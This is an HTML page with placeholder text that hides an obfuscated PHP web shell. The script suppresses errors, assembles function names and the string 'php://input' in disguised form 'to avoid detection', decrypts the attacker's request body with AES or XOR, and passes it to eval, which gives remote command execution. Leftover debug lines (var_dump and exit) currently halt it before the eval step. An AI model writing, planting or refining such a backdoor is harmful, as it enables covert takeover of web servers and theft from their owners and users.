<html>
<head>
oh
</head>

<body>
nice




<?php
//error log suppressed to avoid detection
@error_reporting(0);
session_start();

//encryption key
$key="secret";
$_SESSION['k']=$key;

//file_get_content dynamically created to avoid detection
$f='file'.'_get'.'_contents';

//encoding string "php://input
$p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18).chr(12).chr(9).chr(8);

//file_get_content(php://input)
$HA1VG=$f($p);

//test debug

$ciphertext = openssl_encrypt($plaintext, "AES128", $key);
echo $ciphertext;

$HA1VG=$ciphertext;
//if openssl isn't loaded
if(!extension_loaded('openssl')){
	$t=preg_filter('/\s+/','','base 64 _ deco de');
	$HA1VG=$t($HA1VG."");

	for($i=0;$i<strlen($HA1VG);$i++) {
		$new_key = $key[$i+1&15];
		$HA1VG[$i] = $HA1VG[$i] ^ $new_key;
	}
}

else{
	$HA1VG=openssl_decrypt($HA1VG, "AES128", $key);
}

var_dump($HA1VG);
exit;
$arr=explode('|',$HA1VG);
$func=$arr[0];
$params=$arr[1];

class GFvTKW88{
	public function __invoke($p) {
		@eval("\n".$p."\n");
	}
}

@call_user_func(new GFvTKW88(),$params);
?>


</body>
</html>
